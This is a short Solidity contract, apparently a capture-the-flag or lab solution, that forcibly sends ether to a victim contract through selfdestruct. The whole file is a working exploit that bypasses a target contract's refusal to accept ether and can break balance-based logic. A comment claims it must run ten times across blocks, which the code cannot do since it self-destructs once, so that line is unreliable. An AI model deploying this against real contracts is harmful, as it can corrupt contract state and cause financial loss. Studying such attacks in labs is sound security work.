// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract AttackerForce{

    address victim;

    constructor(address _victim) payable {
        require(msg.value > 0);
        victim = _victim;
    }

    function attack() public {
        //Needs to be triggered 10 times in 10 different blocks
        selfdestruct(payable(victim));
    }
}